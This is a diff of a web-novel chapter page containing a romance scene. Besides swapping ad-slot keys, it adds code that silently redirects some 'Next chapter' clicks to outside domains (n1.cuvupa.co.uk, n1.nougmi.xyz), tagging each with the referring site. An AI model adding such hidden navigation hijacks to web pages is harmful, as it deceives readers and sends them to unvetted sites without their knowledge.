@@ -2403,7 +2403,7 @@
                 <p>He sagged against the wall, his tall frame buckling under the weight of his grief. Then—light.</p>
                 <p>The door swung open, harsh fluorescent beams cutting through the dimness.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Thaddeus straightened instantly, masking his turmoil.</p>
                 <p>&#34;Still here? Persistent, aren’t you?&#34;</p>
                 <p>Avery stood before him, smirking. &#34;You saw what happened. She doesn’t need you. She needs me.&#34; His smile sharpened. &#34;But I should thank you. If you hadn’t broken her heart, she never would’ve turned to me.&#34;</p>
@@ -2421,7 +2421,7 @@
                 <p>And he had destroyed it.</p>
                 <p>His chest ached, tears burning behind his eyes.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>&#34;You really want to know?&#34; His voice was raw.</p>
                 <p>&#34;Of course. As the man who’s loved her for fifteen years, I deserve to know everything.&#34;</p>
                 <p>Thaddeus stared at him, eyes dark as a storm.</p>
@@ -2439,7 +2439,7 @@
                 <p>&#34;You’re still fighting for her, aren’t you?&#34; Avery laughed, low and dangerous. &#34;Do you really think you can win?&#34;</p>
                 <p>&#34;I’m not fighting you.&#34; Thaddeus’ gaze was steel. &#34;If you love her, I won’t stand in your way.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>Because he had failed her.</p>
                 <p>If someone else could make her happy, he would let go.</p>
                 <p>&#34;But remember this, Avery.&#34; His voice turned deadly. &#34;I’ll be watching. Cross a line, and I’ll destroy you.&#34;</p>
@@ -2457,7 +2457,7 @@
                 <p>&#34;I’m not going home.&#34; Thaddeus’ voice cracked. &#34;Take me to my grandfather. I need to see him.&#34;</p>
                 <p>Jareth’s breath caught.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>Thaddeus was crying.</p>
                 <p>In twenty years, he had never seen him shed a tear—not even at his mother’s funeral.</p>
                 <p>But for Evadne?</p>
@@ -2496,7 +2496,7 @@
                 <p>A pause.</p>
                 <p>&#34;There’s something else we need to discuss.&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
             </div>
             
             <div class="font-controls">
@@ -2618,7 +2618,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2634,8 +2634,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
